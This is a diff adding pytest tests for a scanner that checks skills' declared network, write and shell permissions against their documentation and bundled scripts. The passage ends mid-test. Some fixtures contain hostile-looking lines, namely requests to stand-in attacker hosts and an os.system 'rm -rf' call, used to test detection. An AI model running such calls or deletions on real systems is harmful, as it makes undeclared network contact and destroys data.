@@ -1,0 +1,964 @@
+"""Tests for the executionRequirements companion drift scanner
+(skills/evaluating-skill-quality/scripts/gitapex_scan_execution_requirements_drift.py,
+issue #1022). Co-located with the scanner itself, mirroring
+skills/evaluating-skill-quality/scripts/test_gitapex_check_skill_shape.py's
+own placement next to gitapex_check_skill_shape.py.
+
+Fixture-based: each ACM-named mismatch shape (disabled-but-networked,
+allowlist-but-out-of-list-host, unrestricted-but-no-network-use, and the
+tools.write/tools.shell under/over-declaration pairs) gets its own test
+against a minimal on-disk skill directory built under tmp_path, plus a
+clean-pass counterpart proving the scanner does not fire on matching
+declarations. Two dedicated regression sections pin correctness bugs two
+independent review rounds found and that were fixed before merge: four
+bugs from an adversarial review, and a second, larger round (an allowlist
+bypass via hostname truncation, alias-resolution gaps, a missing
+RecursionError guard, a silent read-error swallow, and misattributed
+test-file/docstring content, among others) from a multi-angle /code-review
+pass -- see each new test's own docstring for the specific failure
+scenario it pins. The final test is a real-repository *smoke* test only --
+find_drift() must run without raising against the real skills/ tree, but
+its result is deliberately NOT asserted to be empty: issue #1022's own
+Non-goals excludes retroactively auditing every existing skill for a
+pre-existing mismatch, and a live check found several already exist (e.g.
+planning-a-branch-from-an-issue declares shell: [] but its own Step 8
+invokes `python3 scripts/gitapex_check_acm_present.py`). This mirrors
+gitapex_check_skill_shape.py's own un-registered status: neither carries a
+.gitapex/ssot.json gate entry of its own; each is run deliberately against
+one target skill at a time as part of evaluating-skill-quality's own
+"Deterministic shape" lane, not as an automatic repo-wide CI gate.
+"""
+
+from __future__ import annotations
+
+import ast
+import pathlib
+
+import gitapex_scan_execution_requirements_drift as scanner
+import pytest
+
+
+def _make_skill(
+    tmp_path: pathlib.Path,
+    *,
+    name: str = "example-skill",
+    skill_md: str = "# Example Skill\n\n## Steps\n\n1. Read the input.\n",
+    scripts: dict[str, str] | None = None,
+) -> pathlib.Path:
+    skill_dir = tmp_path / name
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text(skill_md, encoding="utf-8")
+    if scripts:
+        scripts_dir = skill_dir / "scripts"
+        scripts_dir.mkdir()
+        for filename, content in scripts.items():
+            (scripts_dir / filename).write_text(content, encoding="utf-8")
+    return skill_dir
+
+
+def _severities(findings: list[scanner.Finding]) -> list[str]:
+    return [f.severity for f in findings]
+
+
+# ---- find_network_drift ----
+
+
+def test_disabled_but_networked_script_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import urllib.request\n"})
+    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "network-mode-vs-script-content" in findings[0].message
+
+
+def test_absent_network_block_but_networked_script_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
+    findings = scanner.find_network_drift(None, skill_dir)
+    assert _severities(findings) == ["error"]
+
+
+def test_disabled_and_no_network_use_is_clean(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_allowlist_with_in_list_host_is_clean(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": 'import urllib.request\nurllib.request.urlopen("https://github.com/x")\n'},
+    )
+    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
+    assert findings == []
+
+
+def test_allowlist_with_out_of_list_host_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com/x")\n'},
+    )
+    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "evil.example.com" in findings[0].message
+
+
+def test_unrestricted_with_use_is_clean(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import httpx\n"})
+    assert scanner.find_network_drift({"mode": "unrestricted"}, skill_dir) == []
+
+
+def test_unrestricted_but_no_use_is_warning(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
+    findings = scanner.find_network_drift({"mode": "unrestricted"}, skill_dir)
+    assert _severities(findings) == ["warning"]
+    assert "over-declared" in findings[0].message
+
+
+def test_no_scripts_directory_does_not_crash(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path)
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+# ---- find_tools_drift ----
+
+
+def test_write_under_declared_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "tools-write-vs-skill-md" in findings[0].message
+
+
+def test_write_declared_and_matches_is_clean(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
+    )
+    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
+    assert findings == []
+
+
+def test_write_declared_but_no_match_is_warning(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
+    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
+    assert _severities(findings) == ["warning"]
+    assert "tools-write-over-declared" in findings[0].message
+    assert "over-declared" in findings[0].message
+
+
+def test_shell_under_declared_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Run `git commit` to record the change.\n",
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "tools-shell-vs-skill-md" in findings[0].message
+
+
+def test_shell_declared_and_matches_is_clean(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Run `git commit` to record the change.\n",
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
+    assert findings == []
+
+
+def test_shell_declared_but_no_match_is_warning(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
+    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
+    assert _severities(findings) == ["warning"]
+    assert "tools-shell-over-declared" in findings[0].message
+
+
+def test_fully_clean_skill_has_no_tools_findings(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
+    assert scanner.find_tools_drift({"write": [], "shell": []}, skill_dir) == []
+
+
+def test_missing_skill_md_does_not_crash(tmp_path: pathlib.Path) -> None:
+    skill_dir = tmp_path / "no-skill-md"
+    skill_dir.mkdir()
+    assert scanner.find_tools_drift({"write": [], "shell": []}, skill_dir) == []
+
+
+# ---- find_tools_drift: script-content signal (AST-based) ----
+
+
+def test_write_under_declared_via_open_write_mode(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("out.txt", "w").close()\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert any("tools-write-vs-script-content" in f.message for f in findings)
+
+
+def test_write_under_declared_via_open_write_mode_keyword(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("out.txt", mode="a").close()\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert any("tools-write-vs-script-content" in f.message for f in findings)
+
+
+def test_open_read_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt", "r").close()\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert not any("tools-write-vs-script-content" in f.message for f in findings)
+
+
+def test_open_default_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt").close()\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert not any("tools-write-vs-script-content" in f.message for f in findings)
+
+
+def test_open_with_unrelated_keyword_and_no_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
+    """A keyword-only call with no "mode" keyword at all (e.g. only
+    encoding=) must walk past every keyword without matching, not crash
+    or false-positive."""
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt", encoding="utf-8").close()\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert not any("tools-write-vs-script-content" in f.message for f in findings)
+
+
+def test_write_under_declared_via_os_remove(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import os\nos.remove("out.txt")\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert any("tools-write-vs-script-content" in f.message for f in findings)
+
+
+def test_write_under_declared_via_pathlib_write_text(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": 'import pathlib\npathlib.Path("out.txt").write_text("x")\n'},
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert any("tools-write-vs-script-content" in f.message for f in findings)
+
+
+def test_write_declared_and_matches_script_content_is_clean(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import os\nos.remove("out.txt")\n'})
+    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
+    assert findings == []
+
+
+def test_shell_under_declared_via_subprocess_run(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import subprocess\nsubprocess.run(["git", "status"])\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert any("tools-shell-vs-script-content" in f.message for f in findings)
+
+
+def test_shell_under_declared_via_aliased_subprocess_import(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": 'import subprocess as sp\nsp.run(["git", "status"])\n'},
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert any("tools-shell-vs-script-content" in f.message for f in findings)
+
+
+def test_shell_under_declared_via_from_subprocess_import(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": 'from subprocess import run\nrun(["git", "status"])\n'},
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert any("tools-shell-vs-script-content" in f.message for f in findings)
+
+
+def test_shell_declared_and_matches_script_content_is_clean(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import subprocess\nsubprocess.run(["git", "status"])\n'})
+    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
+    assert findings == []
+
+
+def test_unrelated_dot_run_method_is_not_a_shell_signal(tmp_path: pathlib.Path) -> None:
+    """A bare method name match on ".run(" would be a severe false-positive
+    source: "run" is an extremely common method name on unrelated objects
+    (a test runner, a workflow class). Only a call resolved back to a real
+    subprocess/os import counts."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": "class Workflow:\n    def run(self):\n        pass\n\nWorkflow().run()\n"},
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert not any("tools-shell-vs-script-content" in f.message for f in findings)
+
+
+def test_over_declared_is_joint_not_per_source(tmp_path: pathlib.Path) -> None:
+    """Over-declaration must not fire just because ONE source shows no
+    evidence -- a skill can validly declare tools.write purely because its
+    own SKILL.md prose instructs the agent to write files, with zero
+    bundled scripts ever doing so directly. Only "neither source shows
+    evidence" is real over-declaration."""
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
+        scripts={"helper.py": "import pathlib\n"},
+    )
+    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
+    assert findings == []
+
+
+def test_over_declared_fires_when_neither_source_has_evidence(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Read the input.\n",
+        scripts={"helper.py": "import pathlib\n"},
+    )
+    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
+    assert _severities(findings) == ["warning"]
+    assert "tools-write-over-declared" in findings[0].message
+
+
+# ---- regression tests for bugs found by an independent adversarial review
+# of this module (fixed before merge; each test pins the fix) ----
+
+
+def test_shell_backtick_alternatives_match_without_a_preceding_run(tmp_path: pathlib.Path) -> None:
+    """The real-world case the module docstring cites as motivation: a
+    prior version of _SHELL_INTENT_PATTERN wrapped every alternative,
+    including four starting with a literal backtick, in one leading \\b --
+    but \\b demands a word/non-word transition, and a backtick is itself
+    non-word, so those four alternatives could never match in ordinary
+    Markdown (a backtick preceded by whitespace/punctuation). Only the
+    generic ``run\\s+```` alternative worked, silently masking the bug --
+    every case below previously returned no match."""
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Its own Step 8 invokes `python3 scripts/gitapex_check_acm_present.py`.\n",
+    )
+    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+    assert _severities(findings) == ["error"]
+
+    for phrase in (
+        'Then invoke `git commit -m "x"` to save.',
+        "Use `uv run pytest` here.",
+        "Finish with `git push` to publish.",
+        "Run `npm install` first.",
+    ):
+        assert scanner._SHELL_INTENT_PATTERN.search(phrase), f"should match: {phrase!r}"
+
+
+def test_write_nouns_do_not_match_as_a_bare_prefix(tmp_path: pathlib.Path) -> None:
+    """A prior version of _WRITE_NOUNS left several alternatives (file,
+    script, branch, commit, document, ...) with no trailing \\b, so they
+    matched as a bare prefix of an unrelated word right after them --
+    "creates a review committee" matched via "commit", "creates a
+    scripting-friendly interface" matched via "script". Neither sentence
+    has anything to do with writing a file; both must produce zero
+    findings when tools.write is correctly declared empty."""
+    cases = {
+        "committee-case": "# Example\n\n## Steps\n\n1. This skill creates a review committee for the launch.\n",
+        "scripting-case": "# Example\n\n## Steps\n\n1. This skill creates a scripting-friendly interface for review.\n",
+    }
+    for name, skill_md in cases.items():
+        skill_dir = _make_skill(tmp_path, name=name, skill_md=skill_md)
+        findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
+        assert findings == [], f"false positive for: {skill_md!r}"
+
+
+def test_null_network_mode_still_fails_closed_on_real_usage(tmp_path: pathlib.Path) -> None:
+    """A prior version used ``network.get("mode", "disabled")``, which only
+    substitutes the default when the key is ABSENT -- a real ``mode: null``
+    (valid YAML) or a mis-cased/typo'd mode string (e.g. "Disabled") passed
+    straight through as the effective mode, matched none of the three
+    recognized-mode branches, and silently returned no findings even
+    against a script making real, unrestricted network calls. Any
+    unrecognized mode value must now fall back to the strictest treatment
+    ("disabled") and still flag real usage."""
+    skill_dir = _make_skill(
+        tmp_path, scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com")\n'}
+    )
+    for network in ({"mode": None}, {"mode": "Disabled"}, {"mode": "off"}):
+        findings = scanner.find_network_drift(network, skill_dir)
+        assert _severities(findings) == ["error"], f"should fail closed for network={network!r}"
+
+
+def test_allowlist_host_comparison_is_case_insensitive(tmp_path: pathlib.Path) -> None:
+    """Hostnames are case-insensitive (RFC 4343); a prior version compared
+    the literal-cased extracted host against the literal-cased declared
+    domains, so a script referencing "https://GitHub.com/x" against a
+    correctly declared ``domains: [github.com]`` produced a false-positive
+    error finding."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": 'import requests\nrequests.get("https://GitHub.com/x")\n'},
+    )
+    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
+    assert findings == []
+
+
+def test_urllib_parse_alone_is_not_network_capable(tmp_path: pathlib.Path) -> None:
+    """A prior version listed bare "urllib" in NETWORK_CAPABLE_MODULES, so
+    the trailing (?:\\.\\w+)* suffix let "import urllib.parse" match too --
+    but urllib.parse performs no network I/O of its own. A skill declaring
+    network.mode: disabled that only imports urllib.parse for pure URL
+    parsing must not be flagged."""
+    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import urllib.parse\n"})
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_from_urllib_import_request_is_now_caught(tmp_path: pathlib.Path) -> None:
+    """The old regex-based scanner disclosed "from urllib import request"
+    as an unfixed false negative, since it anchored on the dotted module
+    path after import/from and could not see that "request" here names
+    the network-capable urllib.request submodule. AST-based import
+    resolution closes this: _tree_has_network_import checks both the
+    ImportFrom node's own module ("urllib") and each imported name
+    joined onto it ("urllib.request")."""
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "from urllib import request\n"})
+    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
+    assert _severities(findings) == ["error"]
+
+
+def test_unparseable_script_is_flagged_not_silently_skipped(tmp_path: pathlib.Path) -> None:
+    """A bundled .py file that is not valid Python (a real SyntaxError)
+    must not be silently excluded from analysis and treated as clean --
+    dimension 15's fail-closed default. find_network_drift reports it as
+    its own undetermined finding rather than either crashing or passing
+    the skill vacuously."""
+    skill_dir = _make_skill(tmp_path, scripts={"broken.py": "def f(:\n    pass\n"})
+    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "network-script-unparseable" in findings[0].message
+    assert "broken.py" in findings[0].message
+
+
+def test_commented_out_url_does_not_count_as_network_usage(tmp_path: pathlib.Path) -> None:
+    """_URL_HOST_PATTERN previously scanned raw script text including
+    comment lines, so a doc reference like "# see https://docs.python.org/"
+    was treated as executed network usage."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"helper.py": "# see https://docs.python.org/3/library/re.html\nimport pathlib\n"},
+    )
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+    assert scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir) == []
+
+
+# ---- regression tests for the second independent-review round (code-review) ----
+
+
+def test_allowlist_host_with_underscore_is_not_truncated_to_a_false_match(tmp_path: pathlib.Path) -> None:
+    """A prior version's _URL_HOST_PATTERN excluded underscore from its
+    hostname character class, so "https://internal_evilhost.attacker.com"
+    matched only up to "internal" -- an allowlisted-looking prefix that
+    silently passed the allowlist check while the real host
+    (attacker.com) was never compared at all. urllib.parse.urlsplit-based
+    extraction must capture the real host in full."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": 'import requests\nrequests.get("https://internal_evilhost.attacker.com/x")\n'},
+    )
+    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["internal"]}, skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "internal_evilhost.attacker.com" in findings[0].message
+
+
+def test_url_literal_without_a_host_contributes_no_referenced_host(tmp_path: pathlib.Path) -> None:
+    """A URL literal that urllib.parse.urlsplit resolves to an empty
+    hostname (e.g. "https:///path", no authority component) must not
+    contribute a spurious host to the referenced-hosts set."""
+    skill_dir = _make_skill(tmp_path, scripts={"helper.py": 'x = "https:///path"\n'})
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_docstring_url_does_not_count_as_network_usage(tmp_path: pathlib.Path) -> None:
+    """A URL inside a module docstring is documentation/citation text, not
+    a network call -- the same "not code" status a comment already has,
+    but ast.Constant does not distinguish a docstring from an ordinary
+    string literal by content alone. _docstring_constant_ids excludes it
+    by body position instead (found live: this exact shape false-positives
+    against this repository's own evaluating-deterministic-gate-quality
+    skill today)."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"helper.py": '"""See https://docs.python.org/3/library/re.html for details."""\nimport pathlib\n'},
+    )
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_module_alias_shadowing_across_scopes_does_not_hide_a_real_call(tmp_path: pathlib.Path) -> None:
+    """_module_aliases previously kept one flat dict overwritten in import
+    order, not scope order: a later "import os as sp" in an unrelated
+    function silently erased an earlier "import subprocess as sp" alias,
+    so the real subprocess.run(...) call resolved to the non-existent
+    "os.run" and went undetected."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "helper.py": (
+                "def helper():\n"
+                "    import subprocess as sp\n"
+                '    sp.run(["ls", "-la"])\n'
+                "\n"
+                "def other():\n"
+                "    import os as sp\n"
+                "    sp.getcwd()\n"
+            )
+        },
+    )
+    findings = scanner.find_tools_drift({}, skill_dir)
+    ids = [f.message.split(":")[0] for f in findings]
+    assert "tools-shell-vs-script-content" in ids
+
+
+def test_import_os_path_submodule_form_is_recognized(tmp_path: pathlib.Path) -> None:
+    """A plain, unaliased "import os.path" binds the local name "os" to
+    the top-level os module itself (Python's own import semantics), so
+    os.system(...) afterward is ordinary, valid code -- but a prior
+    version's alias resolution only matched alias.name == "os" exactly,
+    missing "os.path" as the dotted import name and so never registering
+    the alias at all."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"helper.py": 'import os.path\nos.system("rm -rf /tmp/x")\n'},
+    )
+    findings = scanner.find_tools_drift({}, skill_dir)
+    ids = [f.message.split(":")[0] for f in findings]
+    assert "tools-shell-vs-script-content" in ids
+
+
+def test_write_under_declared_via_pathlib_unlink(tmp_path: pathlib.Path) -> None:
+    """_PATH_WRITE_METHOD_NAMES previously covered only write_text/
+    write_bytes out of pathlib.Path's own mutating-method surface --
+    .unlink() (deleting a file) is just as real a write as those two."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"cleanup.py": 'import pathlib\npathlib.Path("out.txt").unlink()\n'},
+    )
+    findings = scanner.find_tools_drift({}, skill_dir)
+    ids = [f.message.split(":")[0] for f in findings]
+    assert "tools-write-vs-script-content" in ids
+
+
+def test_shell_under_declared_via_os_posix_spawn(tmp_path: pathlib.Path) -> None:
+    """os.posix_spawn is the modern stdlib replacement subprocess itself
+    now uses internally on POSIX -- a prior version enumerated the older
+    os.spawn* family exhaustively but omitted it."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"launch.py": 'import os\nos.posix_spawn("/bin/ls", ["/bin/ls"], {})\n'},
+    )
+    findings = scanner.find_tools_drift({}, skill_dir)
+    ids = [f.message.split(":")[0] for f in findings]
+    assert "tools-shell-vs-script-content" in ids
+
+
+def test_unreadable_script_is_flagged_undetermined_not_silently_clean(tmp_path: pathlib.Path) -> None:
+    """A bundled script that exists but is not valid UTF-8 must not be
+    silently treated as an empty (and therefore clean) module -- a prior
+    version routed the read through a helper that swallowed
+    OSError/UnicodeDecodeError into "", which ast.parse("") accepts as a
+    valid empty tree, scoring a genuinely unreadable script (which could
+    contain real network/write/shell code) as having zero signal --
+    contradicting this module's own stated dimension-15 principle: an
+    inability to verify is a deny, not an assume-clean."""
+    skill_dir = _make_skill(tmp_path, scripts={"broken.py": "placeholder"})
+    (skill_dir / "scripts" / "broken.py").write_bytes(b"\xff\xfe not utf-8")
+    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "network-script-unparseable" in findings[0].message
+    assert "broken.py" in findings[0].message
+
+
+def test_bundled_test_file_is_excluded_from_script_content_scanning(tmp_path: pathlib.Path) -> None:
+    """A skill's own unit-test file legitimately exercises test-double
+    network calls, mocked subprocess invocations, and similar test-only
+    content that is not the skill's own shipped capability -- including it
+    in scripts/*.py scanning misattributes that content as real drift
+    (found live against this repository's own setup-gitapex-toolchain and
+    drafting-an-adr skills, each reporting a finding whose only real
+    source was its own test file)."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "real.py": "import pathlib\n",
+            "test_real.py": 'import requests\nrequests.get("https://example.test/x")\n',
+        },
+    )
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_deterministic_findings_carry_deterministic_kind(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
+    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
+    assert findings and all(f.kind == "deterministic" for f in findings)
+
+
+def test_skill_md_prose_findings_carry_heuristic_kind(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example Skill\n\n## Steps\n\n1. Write the output file.\n",
+    )
+    findings = scanner.find_tools_drift({}, skill_dir)
+    kinds = {f.message.split(":")[0]: f.kind for f in findings}
+    assert kinds["tools-write-vs-skill-md"] == "heuristic"
+
+
+def test_script_content_findings_carry_deterministic_kind(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"helper.py": 'import pathlib\npathlib.Path("out.txt").write_text("x")\n'},
+    )
+    findings = scanner.find_tools_drift({}, skill_dir)
+    kinds = {f.message.split(":")[0]: f.kind for f in findings}
+    assert kinds["tools-write-vs-script-content"] == "deterministic"
+
+
+def test_over_declared_finding_carries_heuristic_kind(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path)
+    findings = scanner.find_tools_drift({"write": ["approved"]}, skill_dir)
+    assert _severities(findings) == ["warning"]
+    assert findings[0].kind == "heuristic"
+
+
+def test_find_skill_drift_parses_bundled_scripts_only_once(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """find_skill_drift computes _bundled_script_trees once and passes the
+    result to both find_network_drift and find_tools_drift, instead of
+    each independently re-reading and re-parsing every bundled script --
+    a prior version parsed every script twice per skill scan."""
+    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
+    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
+    call_count = 0
+    real = scanner._bundled_script_trees
+
+    def counting(skill_dir: pathlib.Path) -> tuple[list[ast.AST], list[str]]:
+        nonlocal call_count
+        call_count += 1
+        return real(skill_dir)
+
+    monkeypatch.setattr(scanner, "_bundled_script_trees", counting)
+    scanner.find_skill_drift(skill_dir)
+    assert call_count == 1
+
+
+# ---- find_drift (integration) ----
+
+
+def _write_sidecar(skill_dir: pathlib.Path, execution_requirements: dict[str, object]) -> None:
+    metadata_dir = skill_dir / "metadata"
+    metadata_dir.mkdir()
+    (metadata_dir / "gitapex.yaml").write_text(
+        "apiVersion: gitapex.io/v1alpha1\n"
+        "kind: SkillMetadata\n"
+        f"metadata:\n  name: {skill_dir.name}\n"
+        "spec:\n"
+        "  executionRequirements:\n"
+        f"    network:\n      mode: {execution_requirements.get('network_mode', 'disabled')}\n"
+        f"    tools:\n"
+        f"      write: {execution_requirements.get('write_tags', [])}\n"
+        f"      shell: {execution_requirements.get('shell_tags', [])}\n",
+        encoding="utf-8",
+    )
+
+
+def test_find_drift_wires_network_and_tools_checks_end_to_end(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
+        scripts={"fetch.py": "import urllib.request\n"},
+    )
+    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
+
+    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)
+
+    messages = [f.message for f in findings]
+    assert any("network-mode-vs-script-content" in m and m.startswith("example-skill:") for m in messages)
+    assert any("tools-write-vs-skill-md" in m and m.startswith("example-skill:") for m in messages)
+
+
+def test_find_drift_below_floor_is_error(tmp_path: pathlib.Path) -> None:
+    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=5)
+    assert _severities(findings) == ["error"]
+    assert "skill-discovery-floor" in findings[0].message
+
+
+def test_find_drift_missing_sidecar_is_error(tmp_path: pathlib.Path) -> None:
+    _make_skill(tmp_path)
+    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)
+    assert _severities(findings) == ["error"]
+    assert "metadata-file-present" in findings[0].message
+
+
+# ---- find_skill_drift (single-target, the CLI's own entry point) ----
+
+
+def test_find_skill_drift_wires_network_and_tools_checks(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
+        scripts={"fetch.py": "import urllib.request\n"},
+    )
+    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
+
+    findings = scanner.find_skill_drift(skill_dir)
+
+    messages = [f.message for f in findings]
+    assert any("network-mode-vs-script-content" in m for m in messages)
+    assert any("tools-write-vs-skill-md" in m for m in messages)
+    # Unlike find_drift(), messages carry no skill-name prefix -- single-target use.
+    assert not any(m.startswith("example-skill:") for m in messages)
+
+
+def test_find_skill_drift_missing_sidecar_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path)
+    findings = scanner.find_skill_drift(skill_dir)
+    assert _severities(findings) == ["error"]
+    assert "metadata-file-present" in findings[0].message
+
+
+def test_find_skill_drift_invalid_yaml_sidecar_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path)
+    metadata_dir = skill_dir / "metadata"
+    metadata_dir.mkdir()
